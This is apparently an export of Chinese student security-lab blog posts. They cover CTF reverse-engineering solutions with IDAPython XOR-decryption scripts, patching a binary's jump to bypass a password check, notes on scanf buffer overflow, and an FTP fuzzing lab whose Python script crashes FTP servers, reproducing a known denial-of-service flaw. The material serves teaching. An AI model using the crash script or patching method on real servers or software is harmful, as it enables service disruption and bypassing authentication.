<figure class="highlight python"><figcaption><span>rev_payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rev_3</span>():</span><br><span class="line">  <span class="built_in">str</span> = <span class="string">'''qxbxpluxvwhuzjct'''</span></span><br><span class="line">  ori_str = <span class="built_in">list</span>(<span class="built_in">str</span>)</span><br><span class="line">  <span class="comment"># 解密x=9(y-7) ord('a')=97</span></span><br><span class="line">  new_str = [<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">97</span> - <span class="number">7</span> + <span class="number">26</span>) * <span class="number">9</span> % <span class="number">26</span> + <span class="number">97</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ori_str]</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">''</span>.join(new_str))</span><br></pre></td></tr></tbody></table></figure>
<p>其输出结果为 <code>doyouknownfangshe</code>。</p>
<p>将其作为命令行参数运行程序，结果为下图所示</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/17.png" class="">
<p>成功达成目标</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析 —SMC</title>
    <url>/2019/05/30/experiments/security/reverse/smc/</url>
    <content><![CDATA[<p>了解 SMC 代码自修改程序在逆向分析中的表示，并体验其分析过程。</p>
<span id="more"></span>
<h2 id="初识程序">初识程序</h2>
<img data-src="/2019/05/30/experiments/security/reverse/smc/1.png" class="">
<p>打开所给程序，发现里面什么都没有，在里面试着输入一些内容后，发现它返回 <code>try again</code>，看来只有想办法看到源代码了。</p>
<p>把这个程序拖入 IDA，发现可以找到 <code>main</code> 函数，且结构并不是很复杂，所以现在可以着手开始看了～</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/3.png" class=""></div></div></div>
<h2 id="逐层分析并解密">逐层分析并解密</h2>
<h3 id="第一层加密">第一层加密</h3>
<img data-src="/2019/05/30/experiments/security/reverse/smc/4.png" class="">
<p>从结构图来看，程序整体是分支 - 循环结构，且观察下边的分支可以大概分析出，我们的输入多半走了最左端的红线，输出了一个 <code>Try again</code>（但是因为没有 <code>system("pause")</code> 而直接退出了程序）。而想要继续分析下去，找到 flag，右边的循环部分是重点。来，看看循环吧。</p>
<p>输入的内容长度必须为 <code>28</code>（<code>1Ch</code>），才能进入到右边的绿线。</p>
<p>当最后一个字符为 7Dh（<code>}</code> 右花括号）时，进入右侧的循环。右侧的循环一共进行了 67 次（<code>43h</code>），每次都对 <code>byte_414C3C[i]</code> 中的内容异或了一个常数 <code>0x7D</code>。67 次循环结束后，程序 call 了一下 <code>[ebp-6Ch]</code> 中的内容，结合刚才的过程，<code>[ebp-6Ch]</code> 中的东西应该是一个函数，但是现在我们还不知道它是什么，我们需要写一个脚本来把隐藏的函数弄出来。</p>
<img data-src="/2019/05/30/experiments/security/reverse/smc/5.png" class="">
<p>Hex-Rays 为快速修改二进制码提供了一个 API 接口，其 Python 接口称为 IDAPython，文档为 <a href="https://www.hex-rays.com/products/ida/support/idapython_docs/%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AA%E9%9C%80%E8%A6%81%E5%85%B6%E4%B8%AD%E7%9A%84">https://www.hex-rays.com/products/ida/support/idapython_docs/，我们只需要其中的</a> <code>patch_bytes(address, buf)</code> 即可。</p>
<div class="note info"><h4 id="IDA-Python-常用的-API">IDA-Python 常用的 API</h4>
<p>可以看到，idaapi.py 提供了这些常用函数，对于本次实验来说已经足够。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">get_bytes(address,count) <span class="comment"># 从address处读取count个字节的内容</span></span><br><span class="line">patch_bytes(address,buf) <span class="comment"># 将address地址处patch为buf的内容</span></span><br><span class="line">Xrefsto(address,flags=<span class="number">0</span>) <span class="comment"># 找到所有引用了address的地址</span></span><br><span class="line">byte(address) <span class="comment"># 获取address地址的一个字节的内容</span></span><br></pre></td></tr></tbody></table></figure></div>
<figure class="highlight python"><figcaption><span>part_1</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xorize</span>(<span class="params">start_loc, end_loc, num</span>):</span><br><span class="line">  <span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(start_loc, end_loc):</span><br><span class="line">    patch_bytes(addr, get_bytes(addr) ^ num))</span><br><span class="line">    addr+=<span class="number">1</span></span><br><span class="line">xorize(<span class="number">0x00414c3c</span>, <span class="number">0x00414c7f</span>, <span class="number">0x7d</span>) <span class="comment"># for part 1</span></span><br></pre></td></tr></tbody></table></figure>
<p>可以观察到，执行脚本后，<code>byte_414C3C</code> 中的内容发生了改变，我们紧接着将其转换为汇编代码（按<kbd> C</kbd> 键），可以看到<code>.data</code> 字段变红，然后，右键起始地址，选择 create function，将其反编译为函数，</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/6.png" class=""></div><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/7.png" class=""></div></div></div>
<img data-src="/2019/05/30/experiments/security/reverse/smc/8.png" class="">
<p>现在这样就非常容易分析了，我们输入字符的前五位一定是 <code>flag{</code>，加上结尾的<code>}</code>，已经解决了 28 个字符的 6 个，剩下的还需慢慢来。</p>
<h3 id="第二层加密">第二层加密</h3>
<img data-src="/2019/05/30/experiments/security/reverse/smc/9.png" class="">
<p>我们留意到，下方有一个 <code>do-while</code> 循环，一共循环了 90 次，它的作用是将 <code>a2</code> 中的内容与 <code>0x43</code> 异或，想要解密，我们异或回去即可。留意到前面 <code>main</code> 函数调用的方式，可知这次利用到了 <code>unk_414BE0</code> 中的内容。在这一步结束后，对剩余的部分调用 <code>a2</code> 函数，我们现在不知道它是什么，必须先把它解出来。</p>
<p>继续写 payload，加载 payload。来到第三层加密。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/10.png" class=""></div><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/11.png" class=""></div></div></div>
<figure class="highlight python"><figcaption><span>part_2</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">xorize(<span class="number">0x00414be0</span>, <span class="number">0x00414c3a</span>, <span class="number">0x43</span>) <span class="comment"># for part 2, see previous for xorize() definition</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="第三层加密">第三层加密</h3>
<img data-src="/2019/05/30/experiments/security/reverse/smc/12.png" class="">
<p>终于来到了第三层函数，留意一下 <code>sub_414C3C</code> 中的 <code>a2(a1 + 5, &amp;unk_414A84);</code>。<code>unk_414A84</code> 其中的内容需要经过 347 次循环，每一次将一位内容与 <code>0x55</code> 异或，步骤类似前面。</p>
<figure class="highlight python"><figcaption><span>pre_part_3</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">xorize(<span class="number">0x00414a84</span>, <span class="number">0x00414bdf</span>, <span class="number">0x55</span>) <span class="comment"># for part 3, see previous for xorize() definition</span></span><br></pre></td></tr></tbody></table></figure>
<p>经过以上 Payload 得到以下这样：</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/13.png" class=""></div><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/14.png" class=""></div></div></div>
<img data-src="/2019/05/30/experiments/security/reverse/smc/15.png" class="">
<p>注意到这里还有一层异或加密，先解开再说。由 <code>414be0</code> 中的 <code>a2(a1 + 4, (const char *)&amp;unk_414A30);</code> 得知，是 <code>414a30</code> 中的东西被调用了，所以要把它解开，逐位异或 <code>0x4d</code> 83 次即可</p>
<figure class="highlight python"><figcaption><span>part_3_smc</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">xorize(<span class="number">0x00414a30</span>, <span class="number">0x00414a84</span>, <span class="number">0x4d</span>) <span class="comment"># for part 3, see previous for xorize()</span></span><br></pre></td></tr></tbody></table></figure>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/16.png" class=""></div><div class="group-picture-column"><img data-src="/2019/05/30/experiments/security/reverse/smc/17.png" class=""></div></div></div>
<p>（截图中 v2 的值不太对，实际上是 - 1）</p>
<p>第三层的主要作用则是判断接下来的 4 个字符与 <code>0xCC</code> 异或后的结果要与一串硬编码的值相同（注意到 <code>v5 = 0x93A9A498</code>）。经过运算该值为 <code>The_</code></p>
<p>第三层的解密脚本如下（注意逆序）</p>
<figure class="highlight python"><figcaption><span>part_3</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">part_3</span>():</span><br><span class="line">  src=[<span class="number">0x98</span>,<span class="number">0xa4</span>,<span class="number">0xa9</span>,<span class="number">0x93</span>]</span><br><span class="line">  res=<span class="string">''</span></span><br><span class="line">  <span class="keyword">for</span> num <span class="keyword">in</span> src:</span><br><span class="line">    num^=<span class="number">0xcc</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(num)</span><br><span class="line">  <span class="built_in">print</span>(res)</span><br></pre></td></tr></tbody></table></figure>
<h3 id="第四层加密">第四层加密</h3>
<p>经过提示，<code>sub_414A84</code> 中进行的是 base64 运算，之后的几个字符串加密应该得到 <code>cmVhbEN0Rl8=</code>，随便找一个在线 base64 解密网站得到该字符串为 <code>realCtF_</code></p>
<h3 id="第五层加密">第五层加密</h3>
<p>第五层，所得字符每一个加一，得到字符串 kvtu`C4h"o (s [5]=`)，经脚本计算后得到字符串为 <code>just_B3g!n</code></p>
<p>第五层的解密代码如下</p>
<figure class="highlight python"><figcaption><span>last_part</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">last_part</span>():</span><br><span class="line">  <span class="built_in">str</span>=<span class="string">'''kvtu`C4h"o'''</span></span><br><span class="line">  ori_str=<span class="built_in">list</span>(<span class="built_in">str</span>)</span><br><span class="line">  new_str=[<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ori_str]</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">''</span>.join(new_str))</span><br></pre></td></tr></tbody></table></figure>
<p>所有的 payload 代码如下所示</p>
<figure class="highlight python"><figcaption><span>all_payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorize</span>(<span class="params">start_loc,end_loc,num</span>):</span><br><span class="line">  <span class="keyword">for</span> addr <span class="keyword">in</span> <span class="built_in">range</span>(start_loc,end_loc):</span><br><span class="line">    patch_byte(addr,get_byte(addr)^num)</span><br><span class="line">    addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">last_part</span>():</span><br><span class="line">  <span class="built_in">str</span>=<span class="string">'''kvtu`C4h"o'''</span></span><br><span class="line">  ori_str=<span class="built_in">list</span>(<span class="built_in">str</span>)</span><br><span class="line">  new_str=[<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ori_str]</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">''</span>.join(new_str))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">  <span class="comment"># may run separately</span></span><br><span class="line">  xorize(<span class="number">0x00414c3c</span>,<span class="number">0x00414c7f</span>,<span class="number">0x7d</span>) <span class="comment"># part 1</span></span><br><span class="line">  xorize(<span class="number">0x00414be0</span>,<span class="number">0x00414c3a</span>,<span class="number">0x43</span>) <span class="comment"># part 2</span></span><br><span class="line">  xorize(<span class="number">0x00414a84</span>,<span class="number">0x00414bdf</span>,<span class="number">0x55</span>) <span class="comment"># part 3</span></span><br><span class="line">  xorize(<span class="number">0x00414a30</span>,<span class="number">0x00414a84</span>,<span class="number">0x4d</span>) <span class="comment"># part 4</span></span><br><span class="line">  last_part() <span class="comment"># last_part</span></span><br></pre></td></tr></tbody></table></figure>
<h2 id="快结束了！">快结束了！</h2>
<p>所有的东西拼在一起为 <code>flag{The_realCtF_just_B3g!n}</code>，此即为最终的 flag 目标。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>基本漏洞利用</title>
    <url>/2019/10/08/experiments/security/software/bufferOverflow/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>通过分析密码验证小程序，初步掌握缓冲区溢出漏洞的原理和应用</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<p>实验的源码如下</p>
<figure class="highlight c"><figcaption><span>password.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">"1234567"</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line">		valid_flag = verify_password(password);</span><br><span class="line">		<span class="keyword">if</span>(valid_flag)</span><br><span class="line">		{</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		{</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		}</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ol>
<li>
<p>简单阅读代码，发现程序检查了一个用户的输入，与内部存储的一个字符串进行比较，若相同，就返回验证成功。否则，显示验证失败并继续验证。 <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/0.png" class=""></p>
</li>
<li>
<p>打开 ollydbg，运行程序，在关键调用处（401030，401080 等地址）打上断点以便观察。 <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/1.png" class=""></p>
<div class="tabs" id="path"><ul class="nav-tabs"><li class="tab active"><a href="#path-1"><i class="fa fa-exclamation-circle"></i>Fail</a></li><li class="tab"><a href="#path-2"><i class="fa fa-check-circle"></i>Success</a></li></ul><div class="tab-content"><div class="tab-pane active" id="path-1"><p><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/2.png" class=""> <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/3.png" class=""></p></div><div class="tab-pane" id="path-2"><p><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/4.png" class=""> <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/5.png" class=""></p></div></div></div>
<div class="note default"><p>这里，已经进入了密码验证函数中，传进来的参数 <code>s1</code> 与内部存储的 <code>s2</code>（<code>"1234567"</code>）进行了 <code>strcmp</code> 比较，<code>strcmp</code> 是一个 C 语言的比较函数，若两个字符串 <code>str1</code> 和 <code>str2</code> 相等，则返回 <code>0</code>，这里不相等，且 <code>str1&lt;str2</code>，所以 <code>strcmp</code> 返回值为 <code>-1</code>，<code>authenticated</code> 的值也为 <code>-1</code>，非零，验证失败。这里也可以看到，在 <code>4010E5</code> 处有一个关键的 <code>JE</code> 跳转，表示表达式为零即跳转，跳转不成功，就会执行打印 <code>"incorrect password!"</code>。若输入了正确密码，则跳转成功，转而执行输出 <code>"Congratulations"</code> 分支。</p>
</div>
</li>
<li>
<p>跳过验证的其中一个方法是修改关键部位的汇编语句。比如，把地址 <code>004010E5</code> 的 <code>JE</code> 改为 <code>JNZ</code>，具体方法是把 <code>opcode</code> 从 <code>74</code> 改成 <code>75</code>。这样修改的道理是取反逻辑，把原来的 “输入正确即通过验证” 改为 “输入不正确即可通过验证”，由于未知密码的概率相当大，这样修改相当于跳过了原有的验证过程（当然，假如经过修改后，作了一个 “错误输入” 程序反而崩溃退出了…… 就证明内部定义的密码被你蒙中了）。除此以外，这样的方法是不会对程序运行流程图有大的改变的。</p>
<img data-src="/2019/10/08/experiments/security/software/bufferOverflow/6.png" class=""> <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/7.png" class=""> <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/8.png" class="" title="输错密码也能进">
</li>
<li>
<p>修改汇编语句后，程序运行流程图表示。调试成功后，可以在 IDA 中静态修改相应位置的 opcode，然后 patch 回原来的程序中 <img data-src="/2019/10/08/experiments/security/software/bufferOverflow/9.png" class=""></p>
</li>
</ol>
<h2 id="测试结论">测试结论</h2>
<p>本次实验掌握了 ollydbg 的基本使用技巧和动态调试的快捷键：<kbd>F7</kbd>，<kbd>F8</kbd>，<kbd>F9</kbd>，同时也学会在调试中打断点，以便于观察栈运行情况。通过阅读一个模拟认证的代码，了解简单的认证流程，从安全角度试图对代码进行破解。</p>
<h2 id="思考题">思考题</h2>
<div class="tabs" id="thinking"><ul class="nav-tabs"><li class="tab active"><a href="#thinking-1">思路 1</a></li><li class="tab"><a href="#thinking-2">思路 2</a></li></ul><div class="tab-content"><div class="tab-pane active" id="thinking-1"><p>通过阅读代码并分析得知，只需要让 <code>004010F6</code> 处的代码得以执行，验证就可以通过。除了修改判断逻辑，我们也可以直接切断控制流，让代码不会执行到认证失败流中，从而通过验证。</p>
<p>具体方法：将 <code>0x004010e5</code> 的 <code>jz</code> 改为 <code>jmp</code> 无条件跳转，然后抹掉 (<code>nop</code>)<code>0x004010f4</code> 的 <code>jmp</code> 语句，让验证成功语句得以输出。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/10.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/11.png" class=""></div></div></div>
<p>根据修改之后的程序流图来看，这样改动直接孤立了验证失败流。用户的任何输入都可以一次成功通过验证流程，而不关 <code>verify_password</code> 的结果如何。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/12.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/08/experiments/security/software/bufferOverflow/13.png" class=""></div></div></div></div><div class="tab-pane" id="thinking-2"><div class="note warning"><p>没有成功做出来，只能先把思路留在这里了</p>
</div> 
<p>能不能用缓冲区溢出的方法来破解这个程序呢？</p>
<p>重新阅读代码，发现其中的 <code>password</code> 变量是一个 <code>1024*2</code> 字节长的 <code>char</code> 数组，是有限长度的。而查阅资料知，<code>scanf</code> 是存在安全问题的。例如存在以下代码和运行结果：</p>
<div class="tabs" id="code"><ul class="nav-tabs"><li class="tab active"><a href="#code-1"><i class="fa fa-code"></i>源码</a></li><li class="tab"><a href="#code-2"><i class="fa fa-terminal"></i>运行结果</a></li></ul><div class="tab-content"><div class="tab-pane active" id="code-1"><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{ </span><br><span class="line">   <span class="type">int</span> i=<span class="number">5</span>; </span><br><span class="line">   <span class="type">char</span> pass[<span class="number">6</span>]; </span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>){ </span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%s"</span>,pass); </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i); </span><br><span class="line">   } </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="code-2"><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">12345 5 </span><br><span class="line">123456 5 </span><br><span class="line">1234567 5 </span><br><span class="line">12345678 0 </span><br><span class="line">1234567890 12345 </span><br><span class="line">123456789 57 </span><br></pre></td></tr></tbody></table></figure></div></div></div>
<p>由于 <code>scanf</code> 没有检验结束节点，当数组被溢出到一定程度时，就会覆盖整型变量 <code>i</code>，输出非预期值。我们可以借鉴这个思路，让输入的 <code>password</code> 强行将 <code>valid_flag</code> 置为 <code>0</code>，最好可以跳过检验密码函数，直接进入输出验证成功的函数中，以完成破解。</p></div></div></div>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>缓冲区溢出</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞挖掘与模糊测试</title>
    <url>/2019/11/28/experiments/security/software/fuzzing/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>了解 fuzz 原理，使用此方法模糊测试两种 ftp 服务器软件的漏洞，使其停止工作。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<h3 id="Easy-FTP-Server的Fuzz过程（FtpFuzz工具法）">Easy FTP Server 的 Fuzz 过程（FtpFuzz 工具法）</h3>
<ol>
<li>打开 Easy FTP Server3.1，点击 Start 开始服务。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/1.png" class=""></li>
<li>打开 FTP Fuzzer，把 USER 和 PASS 的参数改为 <code>anonymous</code> <div class="note warning"><p>不要选中右上角的 Fuzz this FTP command</p>
</div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/2.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/3.png" class=""></div></div></div>
</li>
<li>配置 fuzz 所用的脏数据，我们的目标是 <code>LIST</code> 指令。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/4.png" class="" title="这回要选中Fuzz this FTP command"></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/5.png" class="" title="配置fuzzing data 为..?"></div></div></div>
</li>
<li>设置好服务器地址和端口，然后点击 start 开始。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/6.png" class=""> <img data-src="/2019/11/28/experiments/security/software/fuzzing/7.png" class=""></li>
<li>在输出中时不时观察到有 425 错误：不能打开数据连接产生 <img data-src="/2019/11/28/experiments/security/software/fuzzing/8.png" class=""></li>
<li>出现红色的输出代表着 FTP 服务器已经宕机 <img data-src="/2019/11/28/experiments/security/software/fuzzing/9.png" class=""> <img data-src="/2019/11/28/experiments/security/software/fuzzing/10.png" class="" title="服务器端报错印证了这一点"></li>
<li>查看同目录下的 <code>ftptrace.txt</code>，发现是因为输入的命令过长，导致了服务器处理命令时缓冲区溢出，服务宕机。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/11.png" class=""></li>
</ol>
<h3 id="Home-FTP-Server的Fuzz过程（python脚本法）">Home FTP Server 的 Fuzz 过程（python 脚本法）</h3>
<details class="note default no-icon"><summary><p>fuzz 源码</p>
</summary>
<figure class="highlight python"><figcaption><span>fuzz.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftp_test</span>(<span class="params">ip,port1</span>):</span><br><span class="line">    target = ip</span><br><span class="line">    port = port1</span><br><span class="line">    buf = <span class="string">'a'</span>*<span class="number">272</span></span><br><span class="line">    j=<span class="number">1</span></span><br><span class="line">    fuzzcmd = [<span class="string">'mdelete '</span>,<span class="string">'cd '</span>,<span class="string">'mkdir '</span>,<span class="string">'delete '</span>,<span class="string">'cwd '</span>,<span class="string">'mdir '</span>,<span class="string">'mput '</span>,<span class="string">'mls '</span>,<span class="string">'rename '</span>,<span class="string">'site index '</span>]</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        connct = s.connect((target,port))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"[+] Connected!"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"[!] Connection Failed!"</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'USER test\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">'PASS 123456\r\n'</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"[+] Sending payload..."</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fuzzcmd:</span><br><span class="line">        s.send(i + buf*j + <span class="string">'\r\n'</span>)</span><br><span class="line">        s.send(i + buf*j*<span class="number">4</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">        s.send(i + buf*j*<span class="number">8</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">        s.send(i + buf*j*<span class="number">40</span> + <span class="string">'\r\n'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">"[!] Fuzz failed!"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">"[+] Maybe we find a bug!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ftp_test(<span class="string">"127.0.0.1"</span>,<span class="number">21</span>)</span><br></pre></td></tr></tbody></table></figure>

</details>
<ol>
<li>首先让 ollydbg 附加进程到 ftpserver 上 <img data-src="/2019/11/28/experiments/security/software/fuzzing/12.png" class=""></li>
<li>运行脚本，发现全部输出了 <code>fuzz failed</code>，但与此同时，ftp 服务也停止了。下一次再运行脚本，就会输出 <code>Connection failed</code>。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/13.png" class="" title="fuzz failed"></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/16.png" class="" title="connection failed"></div><div class="group-picture-column"><img data-src="/2019/11/28/experiments/security/software/fuzzing/15.png" class="" title="服务也停止了"></div></div></div>
</li>
<li>查看 system log，发现其在接收两次过长参数的 <code>site index</code> 垃圾指令后停止运行。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/17.png" class=""></li>
<li>Homeftpserver 发生崩溃时，跳转到 <code>KERNEL32.77399ED8</code> 时产生了异常 <code>0EEDFADE</code>。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/14.png" class="" title="系统异常"></li>
</ol>
<h2 id="测试结论">测试结论</h2>
<ul>
<li>
<p>2.1 实际上复现了 Quick’n Easy FTP Server Lite Version 3.1 远程拒绝服务漏洞 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，FTP 协议中的 <code>LIST</code> 命令后的用户数据长度如果超过 232，同时最后字符以 <code>?</code> 结尾，就会造成这个程序的崩溃。</p>
</li>
<li>
<p>2.2 可以通过自己编写的 fuzz 代码实现对 ftp 服务器发送脏数据包以实现 fuzz 攻击，达到让目标服务器崩溃的效果。虽然可以找到崩溃的位置，但本次实验未能探究到崩溃的原因。</p>
</li>
</ul>
<h2 id="思考题">思考题</h2>
<ol>
<li>
<p>初次运行结果如下，用 IDA32 位打开源程序进行逆向分析。 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-1.png" class=""></p>
</li>
<li>
<p>整体过程就是加载 <code>user32.dll</code>，打开 <code>password.txt</code> 读出内容，然后与 <code>"1234567"</code> 作比较，若相等，则通过验证。我们可以看到在 <code>sub_401030</code> 有一个无界写入有界的 <code>strcpy</code> 操作，很容易发生溢出，那么我们要怎么知道在什么时候发生溢出呢？</p>
 <div class="note info"><p>sub_401005 仅仅是跳转到了 sub_401030</p>
</div>
 <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-2.png" class=""> <img data-src="/2019/11/28/experiments/security/software/fuzzing/%E6%80%9D%E8%80%83-3.png" class="">
</li>
<li>
